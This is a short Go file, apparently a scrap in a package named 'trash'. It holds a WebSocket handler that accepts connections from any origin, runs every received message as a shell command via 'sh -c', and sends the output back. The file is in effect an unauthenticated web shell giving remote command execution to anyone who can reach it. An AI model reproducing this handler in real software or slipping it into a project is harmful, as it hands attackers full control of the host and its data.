package trash

import (
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os/exec"
)
// http.HandleFunc("/ws", handleConnections)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Fatal(err)
	}
	defer ws.Close()

	for {
		var msg string
		err := ws.ReadJSON(&msg)
		if err != nil {
			log.Printf("error: %v", err)
			break
		}

		out, err := exec.Command("sh", "-c", msg).Output()
		if err != nil {
			out = []byte(fmt.Sprintf("error: %v", err))
		}

		err = ws.WriteMessage(websocket.TextMessage, out)
		if err != nil {
			log.Printf("error: %v", err)
			break
		}
	}
}